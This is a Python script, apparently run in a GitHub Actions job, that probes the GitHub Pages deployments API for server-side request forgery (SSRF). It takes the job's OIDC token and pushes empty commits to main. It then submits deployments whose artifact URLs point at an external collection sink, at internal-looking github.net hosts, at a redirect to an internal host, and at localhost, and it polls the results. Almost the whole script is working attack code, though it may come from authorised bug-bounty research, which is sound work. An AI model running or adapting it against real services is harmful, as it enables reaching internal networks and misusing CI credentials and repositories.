import json, os, ssl, sys, time, urllib.request, urllib.error
RUN=os.environ.get("GITHUB_RUN_ID","0"); REPO=os.environ["GITHUB_REPOSITORY"]
ART=os.environ.get("ART_ID","").strip(); GH=os.environ["GH_TOKEN"]
SINK=os.environ.get("SINK","").rstrip("/"); SHA=os.environ["GITHUB_SHA"]; API="https://api.github.com"
def http(u,m="GET",b=None,t=30):
    r=urllib.request.Request(u,method=m,data=json.dumps(b).encode() if b is not None else None)
    r.add_header("Authorization",f"Bearer {GH}"); r.add_header("Accept","application/vnd.github+json")
    r.add_header("X-GitHub-Api-Version","2022-11-28")
    if b is not None: r.add_header("Content-Type","application/json")
    try:
        with urllib.request.urlopen(r,timeout=t,context=ssl.create_default_context()) as z:
            return z.status,z.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")
    except Exception as e: return -1,f"<{type(e).__name__}:{e}>"
DEP=f"{API}/repos/{REPO}/pages/deployments"

def deploy(bver,url=None):
    b={"pages_build_version":bver,"oidc_token":TOK,"artifact_id":int(ART)}
    if url: b["artifact_url"]=url
    s,body=http(DEP,"POST",b); did=None
    try: did=json.loads(body).get("id")
    except Exception: pass
    return s,did," ".join(body.split())[:110]

def mkcommit(tag):
    """create a REAL empty commit so pages_build_version resolves; returns its sha"""
    s,b=http(f"{API}/repos/{REPO}/git/ref/heads/main")
    try: parent=json.loads(b)["object"]["sha"]
    except Exception: return None,f"ref read {s}"
    s,b=http(f"{API}/repos/{REPO}/git/commits/{parent}")
    try: tree=json.loads(b)["tree"]["sha"]
    except Exception: return None,f"commit read {s}"
    s,b=http(f"{API}/repos/{REPO}/git/commits","POST",
             {"message":f"sep-{tag}-{RUN}","tree":tree,"parents":[parent]})
    try: new=json.loads(b)["sha"]
    except Exception: return None,f"commit create {s} {b[:80]}"
    s2,b2=http(f"{API}/repos/{REPO}/git/refs/heads/main","PATCH",{"sha":new,"force":False})
    return new,f"create={s} advance_ref={s2}"

print("=== ARMS3-START ===",flush=True)
TOK=""
try:
    idu=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL",""); idt=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
    s,b=http(idu) if False else (0,"")
    r=urllib.request.Request(idu); r.add_header("Authorization",f"bearer {idt}")
    with urllib.request.urlopen(r,timeout=30,context=ssl.create_default_context()) as z:
        TOK=json.loads(z.read().decode()).get("value","") or ""
    print(f"[oidc] token_len={len(TOK)}  artifact_id={ART}  sha={SHA[:12]}",flush=True)
    if len(TOK)<20 or not ART:
        print("🔴 ARMING GATE FAILED. No verdict emitted.",flush=True); sys.exit(0)

    print("\n=== GATE 1: reproduce run-1's control (artifact_id only, the RUN'S OWN sha) ===",flush=True)
    s1,d1,m1=deploy(SHA)
    print(f"  G1 own-sha id-only -> {s1} dep={str(d1)[:14]} {m1}",flush=True)

    print("\n=== GATE 2: is the constraint 'a REAL commit' or 'THIS run's commit'? ===",flush=True)
    new,how=mkcommit("g2"); print(f"  made commit {str(new)[:14]} ({how})",flush=True)
    s2,d2,m2=deploy(new) if new else (-1,None,"no commit")
    print(f"  G2 new-real-sha id-only -> {s2} dep={str(d2)[:14]} {m2}",flush=True)
    if not (200<=s1<300):
        print("🔴 VOID: G1 failed, so run-1's control did not reproduce. Rig regression, measuring nothing.",flush=True); sys.exit(0)
    if not (200<=s2<300):
        print(f"◻ CONSTRAINT = THIS RUN'S COMMIT ONLY (G1 {s1} / G2 {s2}). A real-but-foreign commit is "
              "refused, so N destinations need N RUNS with a push between them. Stopping: a matrix here "
              "would collide on one object exactly like run 38692481202.",flush=True); sys.exit(0)
    if d1==d2:
        print("🔴 VOID: G1 and G2 returned the SAME deployment id, so build_version does not separate objects.",flush=True); sys.exit(0)
    print(f"✅ SEPARABLE BY REAL COMMITS: G1 dep={str(d1)[:14]} != G2 dep={str(d2)[:14]}",flush=True)

    GN="https://ssrf-target.iad.github.net"; GF="https://ssrf-target-qq7x4z.iad.github.net"
    DESTS=[("sink",f"{SINK}/C-sink-{RUN}"),("pub200","https://httpbin.org/status/200"),
           ("pub404","https://httpbin.org/status/404"),("nx",f"https://zzq7x4z-nx-{RUN}.example.com/z.tar"),
           ("ghreal",f"{GN}/z-{RUN}.tar"),("ghfake",f"{GF}/z-{RUN}.tar"),
           ("ghredir",f"https://httpbin.org/redirect-to?url={GN}/z-{RUN}.tar"),
           ("loop",f"http://127.0.0.1:8080/z-{RUN}.tar")]
    made={}
    print("\n=== THE SEPARABLE DESTINATION MATRIX ===",flush=True)
    for tag,url in DESTS:
        sha_t,how=mkcommit(tag)
        if not sha_t: print(f"  {tag:<8} SKIP (commit failed: {how})",flush=True); continue
        s,did,m=deploy(sha_t,url)
        if did: made[tag]=did
        print(f"  {tag:<8} -> {s} dep={str(did)[:14]} {m}",flush=True)
        time.sleep(2)
    print(f"\n  created={len(made)} distinct={len(set(made.values()))}",flush=True)
    if len(made)<2 or len(set(made.values()))!=len(made):
        print("🔴 VOID: ids not distinct.",flush=True); sys.exit(0)
    for wait in (20,60,110):
        time.sleep(20 if wait==20 else 40 if wait==60 else 50)
        print(f"  --- t+{wait}s ---",flush=True)
        for tag,did in made.items():
            s,b=http(f"{API}/repos/{REPO}/pages/deployments/{did}")
            print(f"    {tag:<8} HTTP {s} {' '.join(b.split())[:120]}",flush=True)
finally:
    print("=== ARMS3-END ===",flush=True)
